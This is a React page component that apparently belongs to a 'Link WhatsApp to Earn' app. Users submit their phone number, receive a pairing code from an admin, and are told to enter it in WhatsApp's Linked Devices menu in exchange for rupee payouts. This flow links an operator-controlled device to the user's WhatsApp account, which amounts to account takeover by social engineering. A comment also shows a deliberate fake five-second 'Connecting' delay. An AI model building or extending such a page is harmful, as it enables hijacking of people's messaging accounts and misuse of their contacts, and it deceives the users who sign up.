import React, { useState, useEffect } from "react";
import { motion, AnimatePresence } from "motion/react";
import { MessageCircle, Clock, CheckCircle } from "lucide-react";
import toast from "react-hot-toast";
import { Card, CardContent } from "@/components/ui/Card";
import { Button } from "@/components/ui/Button";
import { useAuth } from "@/contexts/AuthContext";
import { collection, addDoc, query, where, onSnapshot } from "firebase/firestore";
import { db } from "@/lib/firebase";
import { cn } from "@/lib/utils";

export default function WhatsApp() {
  const { appUser } = useAuth();
  const [phoneNumber, setPhoneNumber] = useState("");
  const [requests, setRequests] = useState<any[]>([]);
  const [isLoading, setIsLoading] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    if (!appUser) return;
    const q = query(collection(db, "whatsapp_requests"), where("userId", "==", appUser.uid));
    const unsubscribe = onSnapshot(q, (snapshot) => {
      setRequests(snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() })));
    }, (error) => {
      console.error("Firestore read error:", error);
    });
    return () => unsubscribe();
  }, [appUser]);

  const handleSubmit = async () => {
    if (!phoneNumber || phoneNumber.length < 10) {
      toast.error("Please enter a valid 10-digit phone number");
      return;
    }
    
    if (!appUser) return;

    setIsLoading(true);
    setIsSubmitting(true);
    
    // Simulate a 5-second loading process on the screen limit as requested
    await new Promise(resolve => setTimeout(resolve, 5000));
    
    try {
      await addDoc(collection(db, "whatsapp_requests"), {
        userId: appUser.uid,
        phoneNumber,
        status: "pending",
        createdAt: new Date().toISOString(),
      });
      toast.success("Request sent to Admin! Wait for pairing code.");
      setPhoneNumber("");
    } catch (error) {
      toast.error("Failed to send request");
    } finally {
      setIsLoading(false);
      setIsSubmitting(false);
    }
  };

  return (
    <div className="space-y-6 pb-6 relative">
      <AnimatePresence>
        {isSubmitting && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex flex-col items-center justify-center"
          >
            <div className="w-16 h-16 border-4 border-[#222222] border-t-[#00ec77] rounded-full animate-spin mb-4"></div>
            <h2 className="text-xl font-bold text-white">Connecting WhatsApp...</h2>
            <p className="text-zinc-400 text-sm mt-2">Please wait while we process your request</p>
          </motion.div>
        )}
      </AnimatePresence>

      <div className="flex items-center justify-between">
        <h1 className="text-2xl font-bold tracking-tight text-white mb-2">WhatsApp Task</h1>
      </div>

      <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}>
        <Card className="bg-[#111111] text-white border-[#222222]">
          <CardContent className="p-6 md:p-8 flex flex-col items-center text-center">
            <div className="w-16 h-16 rounded-full bg-[#00ec77]/10 flex items-center justify-center text-[#00ec77] mb-4">
              <MessageCircle className="w-8 h-8 fill-current" />
            </div>
            <h2 className="text-xl font-bold mb-2">Link WhatsApp to Earn</h2>
            <p className="text-zinc-400 text-sm mb-6 max-w-sm">
              Link your WhatsApp account and send request. Points are credited based on Admin approval.
            </p>

            <div className="w-full flex rounded-xl border border-[#333333] overflow-hidden mb-4 focus-within:ring-2 focus-within:ring-[#00ec77] focus-within:border-transparent transition-all">
              <div className="bg-[#1a1a1a] px-4 py-3 border-r border-[#333333] flex items-center gap-2 text-sm font-medium">
                <span className="text-zinc-400">IN</span>
                <span className="text-[#00ec77]">+91 ▾</span>
              </div>
              <input 
                type="tel" 
                value={phoneNumber}
                onChange={(e) => setPhoneNumber(e.target.value)}
                placeholder="Phone Number" 
                maxLength={10}
                className="flex-1 px-4 py-3 outline-none w-full bg-[#0a0a0a] text-white placeholder:text-zinc-600"
              />
            </div>

            <Button 
              onClick={handleSubmit}
              disabled={isLoading || phoneNumber.length < 10}
              className={cn(
                "w-full py-4 rounded-xl font-bold transition-colors border-0 h-auto active:scale-[0.98]",
                phoneNumber.length >= 10 ? "bg-[#00ec77] hover:bg-[#00c965] text-black shadow-lg shadow-[#00ec77]/20" : "bg-[#222222] text-zinc-500 cursor-not-allowed"
              )}
            >
              {isLoading ? 'Submitting...' : 'Send Request'}
            </Button>
          </CardContent>
        </Card>
      </motion.div>

      <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}>
        <h3 className="font-medium text-white mb-3 pl-1">How to link:</h3>
        <Card className="bg-[#111111] text-white border-[#222222]">
          <CardContent className="p-5">
            <ol className="text-sm text-zinc-400 space-y-3 list-decimal list-inside marker:text-zinc-500">
              <li>Open WhatsApp on your phone</li>
              <li>Go to Settings {'>'} Linked Devices</li>
              <li>Tap "Link a Device"</li>
              <li>Choose "Link with phone number instead"</li>
              <li>Enter the pairing code shown below once assigned</li>
            </ol>
          </CardContent>
        </Card>
      </motion.div>

      <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.2 }}>
        <h3 className="font-medium text-white mb-3 pl-1">Request History</h3>
        <Card className="bg-[#111111] text-zinc-500 border-[#222222]">
          <CardContent className="p-0">
            {requests.length === 0 ? (
              <div className="p-6 text-center text-sm font-medium">No requests yet.</div>
            ) : (
              <div className="divide-y divide-[#222222]">
                {requests.map(req => (
                  <div key={req.id} className="p-4 flex flex-col md:flex-row md:items-center justify-between gap-4">
                    <div>
                      <p className="font-bold text-white text-sm">WhatsApp: {req.phoneNumber}</p>
                      <p className="text-xs mt-1">{new Date(req.createdAt).toLocaleString()}</p>
                    </div>
                    
                    {req.loginCode && req.status === 'pending' && (
                      <div className="bg-[#0a0a0a] border border-[#333] p-3 rounded-xl flex items-center justify-between gap-4 md:flex-1 md:max-w-xs">
                         <div>
                           <p className="text-[10px] text-zinc-500 uppercase font-bold tracking-wider mb-1">Pairing Code</p>
                           <p className="text-xl font-mono font-bold text-white tracking-widest">{req.loginCode}</p>
                         </div>
                         <div className="text-amber-500 animate-pulse text-xs font-bold text-right">
                           Awaiting<br/>Login
                         </div>
                      </div>
                    )}
                    
                    <div className="shrink-0 flex justify-end">
                      {req.status === 'pending' ? (
                        <span className="flex items-center gap-1 text-amber-500 bg-amber-500/10 px-2 py-1 rounded text-xs font-bold">
                          <Clock className="w-3 h-3" /> Pending Admin
                        </span>
                      ) : req.status === 'rejected' ? (
                        <span className="flex items-center gap-1 text-red-500 bg-red-500/10 px-2 py-1 rounded text-xs font-bold">
                          Rejected
                        </span>
                      ) : (
                        <span className="flex items-center gap-1 text-[#00ec77] bg-[#00ec77]/10 px-2 py-1 rounded text-xs font-bold">
                          <CheckCircle className="w-3 h-3" /> Approved (+{req.awardedPoints || 0} ₹)
                        </span>
                      )}
                    </div>
                  </div>
                ))}
              </div>
            )}
          </CardContent>
        </Card>
      </motion.div>
    </div>
  );
}
